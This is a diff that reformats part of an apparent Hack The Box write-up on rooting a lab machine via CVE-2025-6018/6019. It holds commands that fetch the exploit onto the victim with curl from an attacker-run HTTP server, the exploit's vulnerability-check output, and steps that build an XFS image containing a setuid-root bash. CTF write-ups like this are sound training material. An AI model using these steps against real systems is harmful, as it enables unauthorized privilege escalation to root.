@@ -340,19 +340,19 @@ now lets get our exploit to put it on the victim system
     
 ```bash
     git clone https://github.com/DesertDemons/CVE-2025-6018-6019.githi
-    ```
+```
     
-    and started python server to uploud the exploit on the host “victim”
+and started python server to uploud the exploit on the host “victim”
     
-    and in the host 
+and in the host 
     
-    ```bash
+```bash
     curl http://my_ip:port/exploit.sh -o exploit.sh 
-    ```
+ ```
     
-    and lets start setting up the exploit and check for the vulns 
+and lets start setting up the exploit and check for the vulns 
     
-    ```bash
+```bash
     phileasfogg3@pterodactyl:~> ./exploit.sh --check
     
     ╔═══════════════════════════════════════════════════════════════╗
@@ -505,48 +505,48 @@ now lets get our exploit to put it on the victim system
     [*] Vulnerability check complete
     phileasfogg3@pterodactyl:~> 
     
-    ```
+```
     
-    as u can see the target is vulnerable for both vulns 
+as u can see the target is vulnerable for both vulns 
     
-    lets make our image to start exploiting 
+lets make our image to start exploiting 
     
-    > now its the next day after alot of trying the exploit was not working bcs of the flags was not compatible with the opensuse , so i had to go with ai to search for solution for this and did this
-    > 
+> now its the next day after alot of trying the exploit was not working bcs of the flags was not compatible with the opensuse , so i had to go with ai to search for solution for this and did this
+  
     
-    ```bash
+```bash
     mkdir /mnt/xfs
-    ```
-    
-    ```bash
+```
+
+```bash
     ❯ dd if=/dev/zero of=xfs.image bs=1M count=300
     
     300+0 records in
     300+0 records out
     314572800 bytes (315 MB, 300 MiB) copied, 0.0525506 s, 6.0 GB/s
-    ```
+```
     
-    ```bash
+```bash
     ❯ mkfs.xfs \
       -m bigtime=0,inobtcount=0 \
       -i nrext64=0,exchange=0 \
       xfs.image
-    ```
+```
     
-    ```bash
+```bash
     ❯ sudo mount -o loop xfs.image /mnt/xfs
-    ```
+```
     
-    ```bash
+```bash
     ❯ scp phileasfogg3@pterodactyl.htb:/bin/bash /tmp/bash_target
     ** WARNING: connection is not using a post-quantum key exchange algorithm.
     ** This session may be vulnerable to "store now, decrypt later" attacks.
     ** The server may need to be upgraded. See https://openssh.com/pq.html
     (phileasfogg3@pterodactyl.htb) Password: 
     bash                             100%  989KB  70.6KB/s   00:14    
-    ```
+```
     
-    ```bash
+```bash
     ❯ sudo cp /tmp/bash_target /mnt/xfs/bash
     ❯ sudo chmod 4755 /mnt/xfs/bash
     
@@ -565,16 +565,15 @@ now lets get our exploit to put it on the victim system
     -rwsr-xr-x 1 root root 1012656 Apr 19 10:54 bash
     ❯ sudo umount /mnt/xfs
     
-    ```
+ ```
     
-    starting http server to transfer the image and the exploit 
+starting http server to transfer the image and the exploit 
     
-    ```bash
+```bash
     python3 -m http.server 8080
-    ```
+ ```
     
-    > didnt work too
-    > 
+> didnt work too
 
 so after alot of tries with the 2025-6019 , i found this repo that make the image with the needed flags https://github.com/0rionCollector/Exploit-Chain-CVE-2025-6018-6019/tree/main
 
